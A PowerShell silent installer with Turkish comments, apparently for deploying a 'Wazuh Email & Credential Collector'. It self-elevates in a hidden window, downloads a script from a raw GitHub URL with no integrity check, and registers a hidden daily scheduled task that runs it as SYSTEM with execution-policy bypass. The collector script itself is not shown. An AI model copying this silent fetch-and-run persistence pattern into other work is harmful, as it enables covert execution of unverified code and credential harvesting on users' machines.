# Wazuh Email & Credential Collector - Silent Installer
# GitHub'dan script indirip sessiz kurulum yapar

param(
    [switch]$Force,
    [switch]$Uninstall
)

# Global değişkenler
$GitHubUrl = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/Collect-EmailAndCreds.ps1"
$WazuhLogDir = "C:\ProgramData\Wazuh\Logs"
$ScriptPath = "$WazuhLogDir\Collect-EmailAndCreds.ps1"
$LogFile = "$WazuhLogDir\email_cred_log.log"
$InstallerLog = "$WazuhLogDir\installer.log"
$TaskName = "Wazuh_Email_Cred_Collector"
$TempScript = "$env:TEMP\Collect-EmailAndCreds_temp.ps1"

# Sessiz log yazma
function Write-InstallerLog {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    try {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $logEntry = "[$timestamp] [$Level] $Message"
        
        # Installer log'a yaz
        if (-not (Test-Path $InstallerLog)) {
            $null = New-Item -Path $InstallerLog -ItemType File -Force
        }
        Add-Content -Path $InstallerLog -Value $logEntry -Encoding UTF8 -ErrorAction SilentlyContinue
        
        # Sadece ERROR'ları Event Log'a yaz
        if ($Level -eq "ERROR") {
            try {
                Write-EventLog -LogName Application -Source "Wazuh Collector" -EventId 1001 -EntryType Error -Message $Message -ErrorAction SilentlyContinue
            }
            catch {
                # Event source yoksa oluştur
                try {
                    New-EventLog -LogName Application -Source "Wazuh Collector" -ErrorAction SilentlyContinue
                    Write-EventLog -LogName Application -Source "Wazuh Collector" -EventId 1001 -EntryType Error -Message $Message -ErrorAction SilentlyContinue
                }
                catch { }
            }
        }
    }
    catch { }
}

# Yönetici hakları kontrolü
function Test-IsAdmin {
    try {
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    catch {
        return $false
    }
}

# Script'i yönetici olarak yeniden başlat
function Restart-AsAdmin {
    if (-not (Test-IsAdmin)) {
        try {
            $arguments = ""
            if ($Force) { $arguments += " -Force" }
            if ($Uninstall) { $arguments += " -Uninstall" }
            
            Start-Process PowerShell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"$arguments" -Verb RunAs -Wait
            exit 0
        }
        catch {
            Write-InstallerLog "Yonetici haklariyla calistirilamadi: $_" "ERROR"
            exit 1
        }
    }
}

# Wazuh dizinini oluştur (koruma olmadan - Wazuh Agent erişimi için)
function New-WazuhDirectory {
    param([string]$Path)
    
    try {
        Write-InstallerLog "Wazuh dizini olusturuluyor: $Path"
        
        if (-not (Test-Path $Path)) {
            $null = New-Item -ItemType Directory -Path $Path -Force
            Write-InstallerLog "Dizin olusturuldu: $Path"
        }
        
        # Wazuh Agent erişimi için özel izin ayarlama
        $acl = Get-Acl $Path
        
        # SYSTEM, Administrators ve Users için tam erişim (Wazuh Agent genellikle service olarak çalışır)
        $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $usersRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Users", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
        
        $acl.SetAccessRule($systemRule)
        $acl.SetAccessRule($adminRule)
        $acl.SetAccessRule($usersRule)
        
        Set-Acl -Path $Path -AclObject $acl
        
        Write-InstallerLog "Wazuh Agent erisimi icin izinler ayarlandi"
        return $true
    }
    catch {
        Write-InstallerLog "Wazuh dizini olusturulamadi $Path : $_" "ERROR"
        return $false
    }
}

# GitHub'dan script indir
function Download-ScriptFromGitHub {
    try {
        Write-InstallerLog "GitHub'dan script indiriliyor: $GitHubUrl"
        
        # TLS 1.2 zorunlu
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        
        # Script'i indir
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($GitHubUrl, $TempScript)
        
        if (Test-Path $TempScript) {
            $fileSize = (Get-Item $TempScript).Length
            Write-InstallerLog "Script basariyla indirildi: $fileSize bytes"
            return $true
        } else {
            Write-InstallerLog "Script indirilemedi" "ERROR"
            return $false
        }
    }
    catch {
        Write-InstallerLog "GitHub'dan indirme hatasi: $_" "ERROR"
        
        # Alternatif olarak Invoke-WebRequest dene
        try {
            Write-InstallerLog "Alternatif yontem deneniyor..."
            Invoke-WebRequest -Uri $GitHubUrl -OutFile $TempScript -UseBasicParsing
            
            if (Test-Path $TempScript) {
                Write-InstallerLog "Alternatif yontemle basarili"
                return $true
            }
        }
        catch {
            Write-InstallerLog "Alternatif yontem de basarisiz: $_" "ERROR"
        }
        
        return $false
    }
}

# Script'i hedef konuma kopyala
function Copy-ScriptToWazuh {
    try {
        Write-InstallerLog "Script Wazuh dizinine kopyalaniyor..."
        
        if (-not (Test-Path $TempScript)) {
            Write-InstallerLog "Kaynak script bulunamadi: $TempScript" "ERROR"
            return $false
        }
        
        # Hedef dosya varsa sil
        if (Test-Path $ScriptPath) {
            Remove-Item $ScriptPath -Force -ErrorAction SilentlyContinue
        }
        
        # Kopyala
        Copy-Item $TempScript $ScriptPath -Force
        
        # Temp dosyasını sil
        Remove-Item $TempScript -Force -ErrorAction SilentlyContinue
        
        # Doğrula
        if (Test-Path $ScriptPath) {
            $scriptSize = (Get-Item $ScriptPath).Length
            Write-InstallerLog "Script basariyla kopyalandi: $ScriptPath ($scriptSize bytes)"
            return $true
        } else {
            Write-InstallerLog "Script kopyalanamadi" "ERROR"
            return $false
        }
    }
    catch {
        Write-InstallerLog "Kopyalama hatasi: $_" "ERROR"
        return $false
    }
}

# Zamanlanmış görev oluştur
function New-ScheduledTask {
    try {
        Write-InstallerLog "Zamanlanmis gorev olusturuluyor..."
        
        # Mevcut görevi kontrol et
        $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        
        if ($existingTask -and -not $Force) {
            Write-InstallerLog "Zamanlanmis gorev zaten mevcut: $TaskName"
            return $true
        }
        
        if ($existingTask) {
            Write-InstallerLog "Mevcut gorev kaldiriliyor..."
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        }
        
        # Yeni görev oluştur
        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
        $trigger = New-ScheduledTaskTrigger -Daily -At "09:00"
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 1)
        
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Wazuh Email and Credential Monitoring - Silent Version"
        
        Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force | Out-Null
        
        Write-InstallerLog "Zamanlanmis gorev basariyla olusturuldu: $TaskName"
        return $true
    }
    catch {
        Write-InstallerLog "Zamanlanmis gorev olusturulamadi: $_" "ERROR"
        return $false
    }
}

# Kaldırma işlemi
function Remove-Installation {
    try {
        Write-InstallerLog "Wazuh Collector kaldiriliyor..."
        
        # Scheduled task kaldır
        $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
            Write-InstallerLog "Zamanlanmis gorev kaldirild: $TaskName"
        }
        
        # Script dosyasını sil
        if (Test-Path $ScriptPath) {
            Remove-Item $ScriptPath -Force
            Write-InstallerLog "Script dosyasi silindi: $ScriptPath"
        }
        
        # Log dosyasını da sil (sessiz)
        if (Test-Path $LogFile) {
            Remove-Item $LogFile -Force -ErrorAction SilentlyContinue
            Write-InstallerLog "Log dosyasi silindi: $LogFile"
        }
        
        Write-InstallerLog "Kaldirma islemi tamamlandi"
        return $true
    }
    catch {
        Write-InstallerLog "Kaldirma sirasinda hata: $_" "ERROR"
        return $false
    }
}

# Sessiz test ve doğrulama
function Test-Installation {
    try {
        Write-InstallerLog "Kurulum dogrulamasi yapiliyor..."
        
        $success = $true
        
        # Script dosyası var mı?
        if (Test-Path $ScriptPath) {
            Write-InstallerLog "Script dosyasi mevcut: $ScriptPath"
        } else {
            Write-InstallerLog "Script dosyasi bulunamadi!" "ERROR"
            $success = $false
        }
        
        # Scheduled task var mı?
        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($task) {
            Write-InstallerLog "Zamanlanmis gorev mevcut: $TaskName - Durum: $($task.State)"
            $nextRun = ($task | Get-ScheduledTaskInfo).NextRunTime
            if ($nextRun) {
                Write-InstallerLog "Sonraki calisma: $nextRun"
            }
        } else {
            Write-InstallerLog "Zamanlanmis gorev bulunamadi!" "ERROR"
            $success = $false
        }
        
        # Test çalıştırma (sessiz)
        if ($success) {
            Write-InstallerLog "Test calistirmasi yapiliyor..."
            try {
                $result = & PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $ScriptPath 2>&1
                Write-InstallerLog "Test calistirma basarili"
            }
            catch {
                Write-InstallerLog "Test calistirma hatasi: $_" "ERROR"
            }
        }
        
        if ($success) {
            Write-InstallerLog "KURULUM BASARIYLA TAMAMLANDI"
        } else {
            Write-InstallerLog "KURULUM SIRASINDA HATALAR OLUSTU" "ERROR"
        }
        
        return $success
    }
    catch {
        Write-InstallerLog "Dogrulama sirasinda hata: $_" "ERROR"
        return $false
    }
}

# Ana fonksiyon - Sessiz çalışma
function Main {
    # Yönetici hakları kontrolü
    Restart-AsAdmin
    
    Write-InstallerLog "=== WAZUH COLLECTOR SILENT INSTALLER BASLADI ==="
    Write-InstallerLog "Installer Version: 3.0 Silent"
    Write-InstallerLog "GitHub Source: $GitHubUrl"
    
    # Kaldırma modu
    if ($Uninstall) {
        Write-InstallerLog "Kaldirma modu aktif"
        $result = Remove-Installation
        Write-InstallerLog "=== KALDIRMA ISLEMI TAMAMLANDI ==="
        exit $(if($result) { 0 } else { 1 })
    }
    
    # Kurulum adımları
    $steps = @(
        @{ Name = "Wazuh dizini olusturma"; Function = { New-WazuhDirectory $WazuhLogDir } },
        @{ Name = "GitHub'dan script indirme"; Function = { Download-ScriptFromGitHub } },
        @{ Name = "Script kopyalama"; Function = { Copy-ScriptToWazuh } },
        @{ Name = "Zamanlanmis gorev olusturma"; Function = { New-ScheduledTask } },
        @{ Name = "Kurulum dogrulama"; Function = { Test-Installation } }
    )
    
    $stepCount = 1
    $allSuccess = $true
    
    foreach ($step in $steps) {
        Write-InstallerLog "Adim $stepCount/$($steps.Count): $($step.Name)"
        
        try {
            $result = & $step.Function
            if ($result) {
                Write-InstallerLog "Adim $stepCount basarili: $($step.Name)"
            } else {
                Write-InstallerLog "Adim $stepCount basarisiz: $($step.Name)" "ERROR"
                $allSuccess = $false
            }
        }
        catch {
            Write-InstallerLog "Adim $stepCount hatasi: $($step.Name) - $_" "ERROR"
            $allSuccess = $false
        }
        
        $stepCount++
    }
    
    if ($allSuccess) {
        Write-InstallerLog "=== TUM ADIMLAR BASARIYLA TAMAMLANDI ==="
        Write-InstallerLog "Script Konumu: $ScriptPath"
        Write-InstallerLog "Log Dosyasi: $LogFile"
        Write-InstallerLog "Zamanlanmis Gorev: $TaskName (Gunluk 09:00)"
        Write-InstallerLog "Installer Log: $InstallerLog"
        exit 0
    } else {
        Write-InstallerLog "=== KURULUM SIRASINDA HATALAR OLUSTU ===" "ERROR"
        exit 1
    }
}

# Hata yakalama ile sessiz çalıştır
try {
    Main
}
catch {
    Write-InstallerLog "KRITIK HATA: $_" "ERROR"
    Write-InstallerLog "Stack Trace: $($_.ScriptStackTrace)" "ERROR"
    exit 1
}
